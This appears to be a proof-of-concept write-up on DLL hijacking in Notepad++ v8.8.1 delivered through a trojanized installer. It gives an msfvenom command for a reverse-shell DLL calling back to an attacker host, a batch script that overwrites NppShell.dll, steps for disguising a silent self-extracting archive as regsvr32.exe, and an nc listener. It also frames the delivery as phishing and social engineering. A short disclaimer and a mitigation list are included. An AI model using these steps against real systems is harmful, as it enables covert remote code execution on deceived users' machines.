# test-notepad-v8.8.1
this is what i do, and at the same time im learning too from everyone

"Here’s a new plugin pack for Notepad++ to improve your coding productivity! Download it now 💡✨"
yes it is pack with real installer and regsvr32.exe , and yes the attack starts there, phishing and social engineering at its best

# DLL Hijacking in Notepad++ v8.8.1: A Practical PoC Write-up

# Introduction
I tried demonstrate a proof-of-concept (PoC) exploit targeting Notepad++ v8.8.1, which is vulnerable to DLL hijacking via the NppShell.dll component(you also can try with others dll files within the notepad installer). This PoC shows how an attacker can achieve arbitrary code execution by planting a malicious DLL and tricking the application into loading it.

⚠️ Disclaimer: This write-up is for educational purposes only. Always test in isolated environments and never target unauthorized systems.

# What is DLL hijacking?
DLL hijacking is a well-known attack technique where an application loads a malicious DLL instead of a legitimate one due to insecure search paths or missing integrity checks. Once the application loads the malicious DLL, attacker-controlled code executes in the context of the application.

🛠️ Environment setup
Victim machine: Windows 11 with Notepad++ v8.8.1 installed

Attacker machine: Kali Linux (any ver)

Tools used: msfvenom, batch scripting, WinRAR (SFX builder)

#  Step-by-step exploit process
1️⃣ Create the malicious NppShell.dll
On Kali, generate a reverse shell DLL payload using msfvenom:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f dll -o NppShell.dll

2️⃣ Prepare an installer batch script
Write a simple install.bat:

echo off
cls
copy /Y NppShell.dll "C:\Program Files\Notepad++\contextMenu\NppShell.dll"
This script overwrites the legitimate NppShell.dll in Notepad++.

3️⃣ Bundle files using SFX archive
Bundle NppShell.dll and install.bat into a self-extracting (SFX) archive named regsvr32.exe.

Configure SFX to automatically run install.bat after extraction.

4️⃣ Deploy and execute

Place the Notepad++ v8.8.1 installer and the malicious regsvr32.exe in the same directory on the victim machine.

5️⃣ Trigger execution

The victim simply double-clicks the Notepad++ installer. Simultaneously, the crafted regsvr32.exe is launched stealthily, executing install.bat to overwrite NppShell.dll with the backdoored DLL.
Because the SFX configuration runs the batch script silently, the victim does not see any additional windows or warnings.
When Notepad++ installed, it automatically loads NppShell.dll. Because it now points to the attacker DLL, your reverse shell connects back to your Kali listener.

6️⃣ Boom! 🎯
On your Kali machine, listen for the shell:

nc -lvnp <attacker_port>
Once Notepad++ installed, connection established — you now have code execution on the victim.

#  Impact💥
This attack enables local privilege escalation or persistence if combined with initial access.

# Mitigation🛡️
Mind to upgrade to latest version 

Remove old or unused DLL files.

Apply strict file system permissions to prevent unauthorized modifications.

 # Important Notes ⚠️ 
This PoC only works during the installation phase.
It requires the victim to execute a trojanized installer package that includes your malicious DLL and script.
It does not work on already installed and running Notepad++ software if it was installed correctly before.

thankyouu!
